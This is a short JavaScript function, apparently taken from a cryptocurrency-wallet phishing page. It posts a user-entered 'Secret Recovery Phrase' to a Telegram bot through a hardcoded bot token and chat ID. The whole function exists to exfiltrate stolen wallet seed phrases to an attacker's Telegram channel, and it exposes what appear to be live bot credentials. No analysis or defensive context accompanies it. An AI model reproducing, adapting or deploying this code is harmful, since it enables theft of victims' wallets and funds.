function sendToTelegram(phrase) {
  const botToken = "7746382704:AAEMNzBZuxGMwFzKBkyqkx4nvef60eWf2jw";
  const chatId = "6996434307";

  fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      chat_id: chatId,
      text: "Secret Recovery Phrase:\n" + phrase.trim()
    })
  });
}
